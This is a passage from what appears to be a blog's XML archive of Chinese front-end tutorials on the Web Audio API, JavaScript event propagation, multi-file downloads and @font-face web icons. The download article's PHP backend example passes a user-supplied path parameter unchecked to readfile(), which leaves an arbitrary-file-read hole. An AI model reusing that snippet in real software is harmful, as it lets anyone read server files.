//将输入数缓冲复制到输出缓冲上 for(var i=0; i&lt;p&gt;下面是整个 DEMO 的代码，效果预览：&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//img.alicdn.com/tfs/TB1oyqGa_tYBeNjy1XdXXXXyVXa-300-300.png&quot; data-original=&quot;/blogimgs/2014/02/22/222051302848233.jpg&quot; data-source=&quot;http://images.cnitblog.com/blog/387325/201402/222051302848233.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;代码：&lt;/p&gt; var AudioContext=AudioContext||webkitAudioContext; var context=new AudioContext; //从元素创建媒体节点 var media=context.createMediaElementSource(audio); //创建脚本处理节点 var processor=context.createScriptProcessor(4096,1,1); //Canvas初始化 var width=canvas.width,height=canvas.height; var g=canvas.getContext("2d"); g.translate(0.5,height/2+0.5); //连接：媒体节点→控制节点→输出源 media.connect(processor); processor.connect(context.destination); //控制节点的过程处理 processor.onaudioprocess=function(e){ //获取输入和输出的数据缓冲区 var input=e.inputBuffer.getChannelData(0); var output=e.outputBuffer.getChannelData(0); //将输入数缓冲复制到输出缓冲上 for(var i=0;i]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>webaudio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让音乐响起来]]></title>
    <url>%2Fblog%2F2014%2F02%2F20%2F2014-02-20-cb-webAudio-listen%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 本系列文章主要是介绍 Web Audio API 的相关知识，由于该技术还处在 web 草案阶段（很多标准被提出来，至于取舍需要等待稳定版文档来确定，草案阶段的文档很多都会被再次编辑甚至重写、全部删除等，不适合作为正式参考），很多 API 都是未确定的，目前支持 Web Audio API 的浏览器是较新版的 Google Chrome 和 FireFox，其他浏览器暂时还没有兼容。现在的网络硬件环境还没有达到普遍语音通信的条件，但是 web语音通信 一定会成为后期 web 研究的一个重要话题，凭着一点个人兴趣，拿出来研究研究~本文主要介绍 Web Audio API 的相关特性，以及音频源的获取方式。本文地址：http://www.cnblogs.com/hustskyking/p/webAudio-listen.html，转载请注明源地址。一、Web Audio在 &lt;audio&gt; 标签的到来之前，Flash 以及其他的插件相继打破 web 的宁静，而如今 audio 被送到了 web 开发之中，我们再也不需要引用各种插件来播放声音了。1. Web Audio API 的特性Web Audio API 是 JavaScript 中主要用于在网页应用中处理音频请求的一个高级应用接口，这个 API 目的是用于让最新技术与传统的游戏音频引擎的综合处理相兼容，也即尽力提供一些桌面音频处理程序的要求。查看音频播放期间调度事件发生的确切时间；支持各种类型的音频过滤波器以实现各种效果，包括回声、消除噪音等；支持利用合成声音（Sound synthesis）创建电子音乐；支持3D位置音频模拟效果，比如某种声音随着游戏场景而移动；支持外部输入的声音与 WebRTC 进行集成（调用 WebRTC ，在你的设备中增添吉他声），或者在 WebRTC 中调用其他地方传输过来的声音；利用音频数据分析创造良好的可视化声音等。2. AudioContent 简介Web Audio API 可以用来操作或者播放网页以及应用中的 audio 资源，在一个 Audio上下文环境（AudioContext）中，有各种 Audio节点（AudioNode），如：InterfacedescriptionAudioContext包含表示连接中间件 AudioNodes 的音频信号曲线图AudioNode表示 audio源，audio输出以及 中间处理模块，他处在 AudioContext 的上下文中AudioDestinationNode他是 AudioNode 的一个子类，表示所有被渲染音频流到达的最终地点AudioBuffer表示 audio资源 的一个临时缓存，可表示一个音频剪辑AudioBufferSourceNode从 AudioBuffer 中生成 audio 的 AudioNode 节点ScriptProcessorNode一个可以直接被 JS 操作的 AudioNode 节点GainNode音频增益节点OscillatorNode一个可产生固定频率的 audio 源还有其他的 API 可以查看http://www.w3.org/TR/webaudio/#APIOverview.使用 AudioContext 实例，我们可以将生成的一个或者多个音频流连接到声音的输出位置，这个连接并不一定是直接送到输出端，期间可以使用 AudioNodes 作为中继器和处理器，让这些声音信号有一个更好的效果。单个 AudioContext 实例可以支持多音频的输入，所以对于一个 audio 应用我们只需要创建一个实例就行了。很多诸如创建一个 AudioNode 节点、解码音频文件等方法都是 AudioContext 的内置方法。创建一个 AudioContext 上下文也十分简单： 12345678var context;try&#123; window.AudioContext = window.AudioContext || window.webkitAudioContext; context = new AudioContext();&#125;catch(e) &#123; alert(&apos;请更新至最新版的 Chrome 或者 Firefox&apos;);&#125; 二、音频流的获取 1. 标签引入 标签引入是最直接的方式， 123&lt;audio autoplay src=&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;&gt; 浏览器不支持 audio 标签。&lt;/audio&gt; 如果浏览器不支持 audio 标签，便会将其当做一个普通元素来解析，中间一行字也就会被显示出来。而支持 audio 标签的浏览器会忽略标签内任何文本。我们还可以为他加上 autoplay 、loop 等属性，使音频在进入页面之后立即循环播放。 123&lt;audio autoplay=&quot;autoplay&quot; controls=&quot;controls&quot; src=&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;&gt; 浏览器不支持 audio 标签。&lt;/audio&gt; controls 属性是用来控制显示音频文件的控制部分的。默认未设置 controls 属性。2. webRTC mediaStream&nbsp;Media Capture (多谢@Hehe123提醒,RTC属于通信了，此处只是获取 media 流)利用 getUserMedia 拿到本地的音频流。 1234567891011121314151617181920212223// 前缀处理window.AudioContext = window.AudioContext || window.webkitAudioContext;navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;var context = new AudioContext();navigator.getUserMedia(&#123;audio: true&#125;, function(stream) &#123; // 获取本地流送入 AudioContext var microphone = context.createMediaStreamSource(stream); // filter为一个中间处理器，用来过滤音频 var filter = context.createBiquadFilter(); // microphone -&gt; filter -&gt; destination. microphone.connect(filter); filter.connect(context.destination);&#125;, function()&#123; console.log(&quot;出了点问题~ 是否在服务器环境下运行？&quot;);&#125;); 这里需要注意的是，使用 webRTC 需要在服务器环境下，你可以搭建一个本地服务器，也可以把代码上传到远程服务器上测试。3. FileSystem选择本地文件，读取音频流，拿到 Blob 流地址，送入 audio 中 123456789&lt;input type=&quot;file&quot; onchange=&quot;return run(this.files);&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;audio controls id=&quot;audio&quot;&gt;&lt;/audio&gt;&lt;script type=&quot;text/javascript&quot;&gt; function run(files)&#123; var blob = window.webkitURL.createObjectURL(files[0]); audio.src = blob; audio.autoplay = &quot;autoplay&quot;; &#125;&lt;/script&gt; 4. 移动设备，还可以使用如下方式 1）HTML Media Capture 1&lt;input type=&quot;file&quot; accept=&quot;audio/*;capture=microphone&quot;&gt; 2）device 元素 1234567&lt;device type=&quot;media&quot; onchange=&quot;update(this.data)&quot;&gt;&lt;/device&gt;&lt;audio autoplay&gt;&lt;script&gt; function update(stream) &#123; document.querySelector(&apos;audio&apos;).src = stream.url; &#125;&lt;/script&gt; 5. 从键盘获取 本质并不是从键盘获取，而是通过键盘获取到我们设定的频率值，然后通过程序创建一段音频。如下面的程序：下面例子中可以按键盘上中间的一排按键（A到K）来发出不同的声音。 123456789101112131415161718var AudioContext=AudioContext||webkitAudioContext;var context=new AudioContext;//为每个键盘位对应一个频率var s=&#123;65:256,83:288,68:320,70:341,71:384,72:426,74:480,75:512&#125;;//为每个频率创建一个Oscillatorfor(var i in s) value=s[i], s[i]=context.createOscillator(), s[i].frequency.value=value, s[i].start();//键盘按下时将相应频率的Oscillator连接到输出源上addEventListener(&quot;keydown&quot;,function(e)&#123; if(e=s[e.keyCode])e.connect(context.destination);&#125;);//键盘松开时将相应频率的Oscillator的连接取消addEventListener(&quot;keyup&quot;,function(e)&#123; if(e=s[e.keyCode])e.disconnect();&#125;); 这段代码引自次碳酸钴的博客. 三、小结 本文是个介绍性的文章，提到了 Web Audio API 的相关知识，以及如何在你的 web 程序中引入 音频流。没有写相关 demo，感兴趣的童鞋可以复制代码自己去测试，在后续文章中会给出测试 DEMO。 四、参考文章 http://www.csdn.net/article/2013-07-10/2816178-Web-Audio-API-Firefox CSND//hacks.mozilla.org/2013/07/web-audio-api-comes-to-firefox/ Mozillahttp://www.html5rocks.com/en/tutorials/webaudio/intro/#toc-context html5rockshttp://www.w3.org/TR/webaudio/ W3 Grouphttp://www.web-tinker.com/article/20497.html&nbsp;次碳酸钴]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>webaudio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript事件机制]]></title>
    <url>%2Fblog%2F2014%2F02%2F17%2F2014-02-17-cb-problem-javascript-event%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 群里童鞋问到关于事件传播的一个问题：\事件捕获的时候，阻止冒泡，事件到达目标之后，还会冒泡吗？”。初学 JS 的童鞋经常会有诸多疑问，我在很多 QQ 群也混了好几年了，耳濡目染也也收获了不少，以后会总结下问题的结论，顺便说说相关知识的扩展~如果贸然回答还会冒泡，这不太好的，稍微严谨点考虑 0级 DOM 事件模型的话，这个答案是否定的。但是在 2级 DOM 事件模型中，答案是肯定的，这个问题值得探讨记录下。本文地址：http://www.cnblogs.com/hustskyking/p/problem-javascript-event.html&nbsp;一、问题结论netscape 和 微软 曾经的战争还是比较火热的，当时， netscape 主张捕获方式，微软主张冒泡方式。后来 w3c 采用折中的方式，平息了战火，制定了统一的标准&mdash;&mdash;先捕获再冒泡。&nbsp;事件的触发有三个阶段document&nbsp;往事件触发地点，捕获前进，遇到相同注册事件立即触发执行到达事件位置，触发事件（多谢&nbsp;@糖果果&nbsp;指出&nbsp;问题&nbsp;，@update 14/2/19 如果该处既注册了冒泡事件，也注册了捕获事件，按照注册顺序执行）事件触发地点往 document 方向，冒泡前进，遇到相同注册事件立即触发这么说很多人比较迷糊，我们在注册事件的时候，通常使用的是 捕获 或者 冒泡 的 一种： 12obj.addEventListener(&quot;click&quot;, func, true); // 捕获方式obj.addEventListener(&quot;click&quot;, func, false); // 冒泡方式 事件只会因为捕获或者冒泡触发一次。举个栗子：点击 s2，结果是：因为这里采用的是捕获模式，从 document 往 s2 走，依次发现 s1 和 s2 都有注册捕获事件，于是便触发了，然后冒泡，没找到冒泡事件，不执行任何操作。如果将 true 改成 false，可以看到结果相反。为了更好的让你理解整个事件机制，我给他们的捕获和冒泡模式下都注册事件：结果真是太清晰了： 二、误区 指出两个误区。1. 在同一个对象上注册事件，并不一定按照注册顺序执行这一点，从上面的例子可以看出，你随便打乱四个事件绑定的顺序，结果一般不变！出现这样结果的原因是存在捕获模式和冒泡模式。但是值得注意的是，下面 #5楼 @糖果果 提出的问题，之所以如此是因为事件目的地节点既绑定了冒泡事件也绑定了捕获事件，此时的执行顺序按照绑定的先后顺序执行（情况比较少见）。2.event.stopPropagation();就是阻止事件的冒泡这个表述不能说他错误，但是是不完整的，他除了阻止事件的冒泡，还阻止事件的继续捕获，简而言之就是阻止事件的进一步传播。下面的例子可以看到：结果是输出了 s1. 三、拓展 1.&nbsp;stopImmediatePropagation 的使用这玩意儿是 w3c 的东西，使用的也不是特别多，我们知道 stopPropagation 可以阻止事件的进一步传播，但是他阻止不了该元素上绑定的其他函数的执行，比如我们在 obj 上绑定了 func1 和 func2，如果我们在 func1 中使用了&nbsp;stopPropagation ，那 func2 依然还是会执行出来。倘若这里使用&nbsp;stopImmediatePropagation，结果就不一样了，他不仅阻止事件的传播，还阻止 func2 的执行。如：结果是：而改成evt.stopImmediatePropagation();之后，阻止了第二个监听事件的触发：结果是：2. setCapture 和 releaseCapture这两个是 IE 下的事件绑定函数，只要我们在某个元素上 setCapture 了，那么你在任何地方的鼠标操作（mouseXXX之类的动作）都会在这个元素上触发（前提是你在这个元素上绑定了事件），releaseCapture 或者本窗口失去聚焦才会释放这个绑定~ 四、小结 对于此类知识的学习，应该查阅官方点的文档，或者看看《JavaScript权威指南》的解说，后期会经常整理诸如此类的问题。若有疑问，可以在下方评论中提出。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript多文件下载]]></title>
    <url>%2Fblog%2F2014%2F02%2F12%2F2014-02-12-cb-multiple-download-with-javascript%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 对于文件的下载，可以说是一个十分常见的话题，前端的很多项目中都会有这样的需求，比如 highChart 统计图的导出，在线图片编辑中的图片保存，在线代码编辑的代码导出等等。而很多时候，我们只给了一个链接，用户需要右键点击链接，然后选择\另存为”，这个过程虽说不麻烦，但还是需要两步操作，倘若用户想保存页面中的多个链接文件，就得重复操作很多次，最常见的就是英语听力网站上的音频下载，手都要点麻！本文的目的是介绍如何利用 javascript 进行多文件的下载，也就是当用户点击某个链接或者按钮的时候，同时下载多个文件。这里的\同时”用的不是很准确，在现代浏览器中可以实现多文件的并行下载，而在一些老版本浏览器，如IE8-，此类的浏览器就只能进行单个文件的下载，但是我们可以让多个文件依次保存下来，算是串行下载吧~若要要无视实现细节，可以直接跳到第三部分，或者戳：代码封装：lib.jsDEMO：javascript-multiple-download&nbsp;(HTTPS，第三个有bug，具体原因下面有说明)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;javascript-multiple-download&nbsp;(HTTP，测试正常) 本文地址：http://www.cnblogs.com/hustskyking/p/multiple-download-with-javascript.html，转载请保留原文地址。一、文件类型介绍及其特点1. 一般类型平时比较常见的有 txt、png、jpg、zip、tar 等各种文件格式，这些文件格式中，一部分浏览器是会直接打开链接显示内容的，而另外一部分，浏览器不识别响应头，或者不能解析对应的格式，于是当做文件直接下载下来了。如： 1&lt;a href=&quot;http://barretlee.com/test.rar&quot;&gt;file&lt;/a&gt; 这句代码，若直接点开链接，浏览器将会直接下载该文件。2. dataURL类型dataURL 也是十分常见的类型，他可以作为 src 或者 url() 的参数送进去。比较常见的有如下几种： 123文本： data:text/plain;这里是正文内容。图片： data:image/jpg;base64,/9j/4AAQSkZJRgABAQEA.... data:image/png;base64,/9j/4AAQSkZJRgABAQEA.... base64 是用的比较广泛的一种数据格式。 123456Base64格式data:[][;charset=][;base64],Base64 在CSS中的使用：.demoImg&#123; background-image: url(&quot;data:image/jpg;base64,/9j/4QMZRXhpZgAASUkqAAgAAAAL....&quot;); &#125;Base64 在HTML中的使用：&lt;img width=&quot;40&quot; height=&quot;30&quot; src=&quot;data:image/jpg;base64,/9j/4QMZRXhpZgAASUkqAAgAAAAL....&quot;&gt; 3. Blob 流 Blob 对象表示不可变的、包含原始数据的类文件对象。具体的内容可以参阅MDN文档。他的使用也是特别的方便，如： 12var aFileParts = [&apos;&lt;a id=&quot;a&quot;&gt;&lt;b id=&quot;b&quot;&gt;hey!&lt;/b&gt;&lt;/a&gt;&apos;];var oMyBlob = new Blob(aFileParts, &#123;type : &apos;text/html&apos;&#125;); // the blob Blob 接收两个参数，一个是数组类型的数据对象，他可以是 ArrayBuffer、ArrayBufferView、Blob、String 等诸多类型；第二个参数是 MINE 类型设置。而本文我们要用到的是 URLcreateObjectURL() 这个函数，他的作用是将一个 URL 所代表的内容转化成一个 DOMString，产生的结果是一个 文件对象 或者 Blob 对象。4. 二进制流我们利用 File API 读取文件的时候，拿到的是数据的二进制流格式，这些类型可以直接被 ArrayBuffer 等接收，本文中没有用到，就不细说了。二、JavaScript 多文件下载HTML5 中 a 标签多了一个属性&mdash;&mdash;download，用户点击链接浏览器会打开并显示该链接的内容，若在链接中加了 download 属性，点击该链接不会打开这个文件，而是直接下载。虽说是比较好用，但低版本浏览器不兼容，这个在本节的 2 和 3 中将会讲到解决方案。在这里，我们可以利用&nbsp;属性检测&nbsp;UA 来判断浏览器类型： 12h5Down = document.createElement(&quot;a&quot;).hasOwnProperty(&quot;download&quot;);var h5Down = !/Trident|MSIE/.test(navigator.userAgent); // Trident 标识 IE11 1. a 标签 download 属性的使用 注：FF5.0 / Safari5.0 / Opera11.1 / IE9.0 不支持 download 属性利用 download 属性可以直接下载单个文件，若想点击一次下载多个文件，就得稍加处理下了： 12345678910function downloadFile(fileName, content)&#123; var aLink = document.createElement(&quot;a&quot;), evt = document.createEvent(&quot;HTMLEvents&quot;); evt.initEvent(&quot;click&quot;); aLink.download = fileName; aLink.href = content; aLink.dispatchEvent(evt);&#125; download 属性的作用除了让浏览器忽略文件的 MIME 类型之外，还会把该属性的值作为文件名。你可以在 chrome 控制台运行这句程序： 1downloadFile(&quot;barretlee.html&quot;, &quot;./&quot;); 浏览器会提示是否保留（下载）该 html 文件。之前我们提到文件类型还可能是 dataURL 或者是 Blob 流，为了让程序也支持这些数据类型，稍微修改下上面的函数： 1234567891011function downloadFile(fileName, content)&#123; var aLink = document.createElement(&apos;a&apos;); , blob = new Blob([content]) , evt = document.createEvent(&quot;HTMLEvents&quot;); evt.initEvent(&quot;click&quot;); aLink.download = fileName; aLink.href = URL.createObjectURL(blob); aLink.dispatchEvent(evt);&#125; new Blob([content])，现将文件转换成一个 Blog 流，然后，使用 URL.createObjectURL() 将其转换成一个 DOMString。这样我们就支持 data64 和其他数据类型的 content 了~2. window.open 之后 execCommand(“SaveAs”)上面也提到了，尽管 download 属性是十分便利的 H5 利器，但低版本 IE 根本不赏脸，要说方法，IE 还是有很多方式去转换的，比如 ADOBE.STREAM 的 activeX 对象可以把文件转换成文件流，然后写入到一个要保存的文件中。这里要谈到的是略微方便一点的方式：先把内容写到一个新开的 window 对象中，然后利用 execCommand 执行保存命令，就相当于我们在页面上按下 Ctrl+S，这样页面内的信息都会 down 下来。 123456// 将文件在一个 window 窗口中打开，并隐藏这个窗口。var win = window.open(&quot;path/to/file.ext&quot;, &quot;new Window&quot;, &quot;width=0,height=0&quot;);// 在 win 窗口中按下 ctrl+s 保存窗口内容win.document.execCommand(&quot;SaveAs&quot;, true, &quot;filename.ext&quot;);// 使用完了，关闭窗口win.close(); 这个过程十分明了，不过这里会存在一个问题，并不是程序的问题，而是浏览器的问题，如果我们用 搜狗浏览器 或者 360浏览器 打开新窗口的话，他会新开一个标签页，而不是新开一个窗口，更可恶的是部分浏览器拦截 window.open 的窗口（这个可以设置）。所以只好另觅他法了。3. iframe 中操作既然新开一个窗口那么麻烦，我就在本窗口下完成工作~ 123456789101112function IEdownloadFile(fileName, contentOrPath)&#123; var ifr = document.createElement(&apos;iframe&apos;); ifr.style.display = &apos;none&apos;; ifr.src = contentOrPath; document.body.appendChild(ifr); // 保存页面 -&gt; 保存文件 ifr.contentWindow.document.execCommand(&apos;SaveAs&apos;, false, fileName); document.body.removeChild(ifr);&#125; 一般的链接我们可以直接给 iframe 添加 src 属性，然后执行 saveAs 命令，倘若我们使用的是 data64 编码的文件，这个怎么办？ 12345var isImg = contentOrPath.slice(0, 10) === &quot;data:image&quot;；// dataURL 的情况isImg &amp;&amp; ifr.contentWindow.document.write(&quot;&lt;img src=&quot;&quot; + contentOrPath + &quot;&quot;&gt;&quot;); 这个也比较好处理，直接把文件写入到 iframe 中，然后在执行保存。三、代码的封装与接口介绍1. 代码的封装以及相关 DEMO封装：lib.jsDEMO：javascript-multiple-download&nbsp;(HTTPS，第三个有bug)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;javascript-multiple-download&nbsp;(HTTP，测试正常)Bug 说明，经过一番细节处理之后，基本兼容各个浏览器，我把代码放在 //raw.github.com 上托管，可能因为是 https 传输，第三个测试中报错了，报错的具体内容是：HTTPS 安全受到 http://rawgithub.com/barretlee/javascript-multiple-download/master/file/test.jpg 的威胁，而 test.txt 文件没有报错。放到 http 协议下测试运行结果是可观的。（这点我没有去深究，肯定是有深层安全方面原因的，难道就因为他是 jpg图片格式？ &nbsp; 谢&nbsp;@屈屈&nbsp;提醒，跨协议传输存在安全问题）后面的 demo 我放在 BAE 上，没有问题，不过没测试 safari 和 opera。2. 接口的调用提供了三个接口，支持单文件下载，多文件下载，多文件下载自定义命名。1）单文件下载 1Downer(&quot;./file/test.txt&quot;); 2）多文件下载 1Downer([&quot;./file/test.txt&quot;,&quot;./file/test.txt&quot;]); 3）多文件下载自定义命名 1234Downer(&#123; &quot;1.txt&quot;:&quot;./file/test.txt&quot;, &quot;2.jpg&quot;:&quot;./file/test.jpg&quot;&#125;); 文件的 URL 如 ./file/test.jpg 都可以改成 base64 或者其他格式,如： 1Downer(&#123; //这是一个很长的 dataURI，我用负的text-indent隐藏了，可直接复制 &quot;data64.jpg&quot; : &quot;data:image/jpg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAAYADsDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD9NgKKK8w8beO/EMVzGdJ08W2jW2t2WnXGpLdx+e7PPEkii3eJgYj5mwsJFkzkquAC3VFc0lFf10/UOlz1CivO9H+LEmreP7jw8mlBrLfPDa6nC1y0cksX30Z2t1hGCHBEcsjAqQVHOJPCfjnxFc+HNU1rxPpmh6Vp9mt232i01WWXmGV0IdXt0CrhD8+45xnaM4A00uZ9rgtZcq3vb5noFLXCfDz4j3vjbT9XM+hSabqdhtItWFxGswZCybTc28DjJDAkx7fRjzi/qmv6zH8LdR1m6sP+Ef12PSprprPzkufssyxMwXeBtfBA5xg0OLi2n/Vwh+8aUep1gFLXGeKhqmj+FtGmt9fvvtVvfWMc9w0VsWvUkuI43WUeVtAIcnMYQggYI6Hs6lqwk7pPuNrkPEHwn8N+KNRkvdQh1BpZJY7ho7fVru3haWPbslMUcqpvXYhD7d2VU54FFFNNxd1uPyJIfhb4dt/EkOuxwXy6hBNJPD/xNLryImkz5myHzPLUNkllC4J5IyAaWP4W+GY7+/uzp7yy3sc8UiTXc0kUazHdMIo2cpDvPLeWFyeTRRRd9wH6B8NNB8NyapJZx38kmpxrFePe6pdXbTKAQMmaRjkAkZHOMDOAKmbwLp9n8Pp/CGkr/Zmm/wBnyadbjLS+QjIUB+ZstjPdsn1oopOTfUa91prdf1+hFrfhnWNb0HSLCTVrGOaC6tbi+mXT323CwyrJtiXzv3RZkXljJgZ4PWuooopNtkpWVkf/2Q==&quot; &#125;); &nbsp;这里只做到了 chrome 兼容，IE 下懒得去看了，这个需求很少见！四、服务器支持与后端实现1. 后端实现不使用前端，直接后端实现的原理，就是在响应头中加入一些特殊的标记，如前端发送这样的请求： 1234function download(path) &#123; var ifrm = document.getElementById(frame); ifrm.src = &quot;download.php?path=&quot;+path;&#125; 后端的响应为 12345&lt;?php header(&quot;Content-Type: application/octet-stream&quot;); header(&quot;Content-Disposition: attachment; filename=&quot;.$_GET[&apos;path&apos;]); readfile($_GET[&apos;path&apos;]);?&gt; 告诉浏览器这是一个流文件，作为附件方式发送给你，请忽略 MINE type，直接保存。2. 服务器配置若后台是 apche 作为服务器，可以配置 htaccess 文件： 123&lt;filesmatch &quot;\.(zip|rar)$&quot;=&quot;&quot;&gt;Header set Content-Disposition attachment&lt;/filesmatch&gt; 意思是只要请求的是 zip 或者 rar 类型的文件，那么就添加一个 Content-Disposition:attachment 的响应头。这样就可以在 php 代码中省略麻烦的操作。 五、小结 由于行文仓促，文中会有不少错误，对多文件下载有更好的提议，希望提出来共同分享！ 实现多文件下载的方式肯定不止上面提到的几种，而且我这里封装的代码并没有在FF safari opera 中实现，因为他们还没兼容 download 属性，具体情况可以查看 caniuse&nbsp;。建议在项目中把这样的事情交给后端，几句代码可以搞定。 六、参考资料 在浏览器端用JS创建和下载文件 AlloyTeamStarting file download with Javascript Ahzaz’s BlogBlob 流 MDN]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>多文件下载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[再探@font-face及webIcon制作]]></title>
    <url>%2Fblog%2F2014%2F01%2F27%2F2014-01-27-cb-manufacture-font-face-in-web%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. @font-face 不能说他是什么新东西了，在 CSS2.0 规范中就有了这玩意儿，IE4.0 开始就已经出现，只是当时用的不是特别广泛，后来在 CSS2.1 草案中又被删掉。随着 web 的急速发展，@font-face 价值越来越凸显，然后再次被纳入 CSS3 草案中。@font-face 是个什么东西，本文不做过多说明，不太清楚的童鞋可以看这里 http://www.w3schools.com/css/css3_fonts.asp。需要强调的是他的书写格式： 123456@font-face &#123; font-family: &lt;yourwebfontname&gt;; src: &lt;source&gt; [&lt;format&gt;][,&lt;source&gt; [&lt;format&gt;]]*; [font-weight: &lt;weight&gt;]; [font-style: &lt;style&gt;];&#125; 举个例子： 123456@font-face &#123; font-family: Gentium; src: url(http://example.com/fonts/Gentium.woff) format(&quot;woff&quot;);&#125;p &#123; font-family: Gentium, serif; &#125; format 是一个可选参数，他的作用是提示该资源 URI 所引用的字体格式，关于字体格式，可以看下面列表：format 格式Font 格式后缀名truetypeTrueType.ttfopentypeOpenType.ttf, .ofttruetype-aatTrueType with Apple Advanced Typography extensions.ttfembedded-opentypeEmbedded OpenType.eotsvgSVG Font.svg, .svgz这堆麻烦的字体格式的出现，是因为各种浏览器对他们的支持程度不一样：浏览器支持类型IE6,7,8仅支持 Embedded OpenType(.eot) 格式。Firefox 3.5支持 TrueType、OpenType(.ttf, .otf) 格式。Firefox 3.6支持 TrueType、OpenType(.ttf, .otf) 及 WOFF 格式。Chrome,Safari,Opera支持 TrueType、OpenType(.ttf, .otf) 及 SVG Font(.svg) 格式。各浏览器具体的支持情况，可以戳这里。除了可以利用 font-face 引入各种炫酷的字体，还一个比较大的用途是使用它们替换网页图标。下面就说一说 @font-face 在 web 开发中比较有用的 webIcon。本文地址：http://www.cnblogs.com/hustskyking/p/manufacture-font-face-in-web.html一、fontCreator 制作 webIcon这部分说的比较啰嗦，算是一个webicon制作教程吧~ 制作的图片取自张鑫旭大哥的鑫表情包~首先说一说什么是 web icon，可以看看这个页面，http://fortawesome.github.io/Font-Awesome/，随便瞄准网页上的一个图标，（chrome浏览器）点击右键审查元素，可以看到页面上的图标都没有使用图片，而是用的特殊的字体： 1234567//html&lt;i class=&quot;fa fa-flag&quot;&gt;&lt;/i&gt;//css.fa-flag:before &#123; content: &quot;\f024&quot;;&#125; 从网页资源列表中可以查看到该网页使用了多种字体：也可以去看看我写的一个 DEMO1. 编码与webIcon编码和字体没有关系，但编码和字符是一一对应的，比如 “\u674e” 对应的是 \李”，”\u9756” 对应的是\靖”。而字体在这里有个什么对应关系呢？不同的字体中显示同一个 unicode 编码，看到的效果是不一样的，我们可以让正楷的 “李” 对应 “\u674e”，也可以用行楷对应，当然我们也可以用一张图片来对应。Web Icon 也就是用图片来对应一些 unicode 码。但是这里存在一个问题，我们用一张图片来对应 \李” 字，倘若想输入一个正常的\李”字，该怎么去对应呢？ Unicode 包含 0-0x10FFFF 共 1114112 个码位，而汉字占用的码位并不多，只有几千个，在制作 webIcon 时可以选择避开常用的字符集。当然， Unicode 编码也给我们提供了码位的专用区（Pricate Use Area），区间是 E000-F8FF，所以我们可以在这个字符集中放肆 DIY 属于我们自己的字体。2. fontCreator 介绍与字体制作Web Icon 的制作，网上有很多在线工具，不过这些在线工具都是从已有的图片中选择对应关系，约束性比较大，fontCreator 是一款比较优秀的字体制作工具，它能够很智能的将我们导入的图片转换成黑白色的位图，我们可以编辑和修改各个位图区域，按照自己的意愿 DIY。打开 fontCreator，新建一个字体：&nbsp;为了方便演示，我只保留了 A-Z 的字符，其他的全部删除了。选中 A ，右击选择导入图片：选择 generate，生成字符内容，然后双击 A，进行细节的编辑（放大，平移）：依次处理其他几个字母。Ctrl+S 保存为 barret.ttf。P.S：由于导入表情调整大小位置过于繁琐，我只做了 A-I 这几个码位对应的符号，测试的时候使用字母 A-I 测试即可~3. 本地测试为了方便本地测试，我们先安装这个字体：打开记事本，选择字体为 barret，字号调大一点，输入 BCDEF 等字符，看看效果：&nbsp;是不是惊呆了，呵呵~字体文件下载：barret.ttf4. 网页测试网页测试之前，需要先转化下格式，至于原因在前言部分我已经说了。我们拿到的是 ttf 的字体格式，为了兼容所有的浏览器，必须修改进行格式转换。进入http://www.fontsquirrel.com/tools/webfont-generator，选择字体，点击 